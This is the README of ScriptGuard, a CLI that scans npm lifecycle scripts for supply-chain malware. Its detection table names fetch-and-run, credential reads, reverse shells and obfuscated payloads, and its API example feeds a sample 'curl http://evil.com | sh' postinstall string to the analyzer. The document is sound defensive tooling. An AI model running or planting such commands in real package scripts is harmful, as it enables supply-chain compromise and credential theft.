# ScriptGuard 🔒

> **Security scanner for npm package lifecycle scripts** — detect malicious `postinstall`, `preinstall`, and `prepare` scripts before they run.

npm supply chain attacks often hide in lifecycle scripts — code that runs automatically during `npm install`. ScriptGuard scans installed packages and flags dangerous patterns like remote code execution, credential theft, data exfiltration, and obfuscated payloads.

## Install

```bash
npm install -g scriptguard
```

## Usage

### Scan your project

```bash
# Scan all installed packages for malicious lifecycle scripts
scriptguard scan

# Scan a specific project path
scriptguard scan --path /path/to/project

# Output as JSON for CI pipelines
scriptguard scan --format json

# Fail CI if high/critical findings found
scriptguard scan --fail-on high

# SARIF output for GitHub Advanced Security
scriptguard scan --format sarif
```

### Check a single package.json

```bash
scriptguard check ./package.json
scriptguard check ./some-module/package.json --format json
```

### List all detection patterns

```bash
scriptguard patterns
```

## What It Detects

ScriptGuard uses 26 detection patterns across 6 categories:

| Category | Examples |
|----------|---------|
| **Network** | `curl \| bash`, silent HTTP requests, DNS exfiltration |
| **Execution** | `eval()`, `child_process`, shell exec, `node -e` |
| **Filesystem** | SSH key access, AWS credential reading, `/etc/passwd` access |
| **Exfiltration** | `process.env` reads, clipboard access, keychain access |
| **Obfuscation** | base64 decode + eval, hex-encoded payloads |
| **Crypto** | Cryptocurrency miners, reverse shells |

## Output Formats

- **Table** (default) — human-readable terminal output with risk scores
- **JSON** — structured data for tooling integration
- **SARIF** — GitHub Advanced Security compatible format

## CI/CD Integration

```yaml
# GitHub Actions
- name: ScriptGuard Security Scan
  run: npx scriptguard scan --fail-on high --format sarif > scriptguard-results.sarif
```

## Programmatic API

```typescript
import { scanProject, analyzePackage } from 'scriptguard';

// Scan an entire project
const result = scanProject({ path: '.', includeDev: false, minRiskLevel: 'low', format: 'table' });
console.log(`Found ${result.totalFindings} findings`);

// Analyze a single package's scripts
const analysis = analyzePackage('my-pkg', '1.0.0', { postinstall: 'curl http://evil.com | sh' });
console.log(analysis.riskLevel); // 'critical'
```

## Why This Exists

- **824+ malicious OpenClaw skills** were found on ClawHub (20% contamination rate)
- **pino-SDK-v2** exfiltrated `.env` secrets to Discord via postinstall
- **Shai-Hulud** supply chain attack compromised hundreds of npm packages
- `npm audit` only checks for known CVEs — not malicious behavior patterns
- No dedicated tool existed for scanning lifecycle scripts

## Tech Stack

- TypeScript, Node.js 18+
- Commander.js (CLI), Zod (validation)
- Zero runtime dependencies beyond CLI framework

## License

MIT
